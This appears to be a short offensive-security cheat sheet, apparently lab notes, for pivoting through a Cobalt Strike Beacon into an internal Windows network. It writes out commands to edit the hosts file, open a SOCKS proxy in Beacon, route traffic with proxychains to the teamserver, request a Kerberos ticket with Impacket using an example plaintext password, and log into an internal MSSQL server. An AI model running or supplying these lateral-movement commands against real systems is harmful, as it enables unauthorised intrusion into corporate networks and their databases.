
Add manual DNS entries
```powershell
Add-Content -Path C:\Windows\System32\drivers\etc\hosts -Value '10.10.120.20 lon-db-1'
```

Start a socks proxy within Beacon
```powershell
socks 1080 socks5
```

Edit `/etc/proxychains.conf` accordingly
```powershell
socks5 [teamserver_ip] 1080
```

Use proxychains to requests tickets and perform attacks
```bash
proxychains getTGT.py 'CONTOSO.COM/rsteel:Passw0rd!' -dc-ip 10.10.120.1

proxychains mssqlclient.py contoso.com/rsteel@lon-db-1 -windows-auth -no-pass -k -dc-ip 10.10.120.1
```